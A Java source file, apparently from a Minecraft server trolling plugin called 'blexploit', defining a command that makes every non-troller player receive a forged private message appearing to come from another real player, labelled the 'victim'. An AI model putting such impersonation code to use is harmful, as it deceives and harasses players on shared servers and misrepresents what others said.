package de.blexploit.command.cmds;

import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import api.Fehler;
import de.blexploit.command.Command;
import de.blexploit.players.Mittrollers;
import de.blexploit.players.create.MittrollerEntity;

public final class Kettennachricht extends Command {

	public Kettennachricht() {
		super("kettennachricht", "Jeder Spieler schickt eine Nachricht", "Nachricht");
	}

	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length > 1) {
			ArrayList<Player> allSenders = new ArrayList<Player>();
			for (Player online : Bukkit.getOnlinePlayers()) {
				if (!Mittrollers.containsP(online)) {
					allSenders.add(online);
				}
			}
			if (allSenders.size() < 2) {
				mt.fehler("Es müssen mindestens zwei Spieler vorhanden sein, die kein Mittroller sind!");
				return;
			}
			String nachricht = api.Get.nextArgs(args, 1);
			for (int i = 0; i < allSenders.size(); i++) {
				Player toSend = allSenders.get(i);
				Player opfer;
				if (i + 1 >= allSenders.size()) {
					opfer = allSenders.get(0);
				} else {
					opfer = allSenders.get(i + 1);
				}
				String color = "";
				if (opfer.isOp()) {
					color = "§4";
				} else {
					color = "§c";
				}
				
				toSend.sendMessage(ChatColor.GOLD + "[" + color + opfer.getName() + ChatColor.GOLD + " -> "
						+ ChatColor.RED + "me" + ChatColor.GOLD + "] " + ChatColor.WHITE + nachricht);
			}

		} else {
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
		}
	}
}
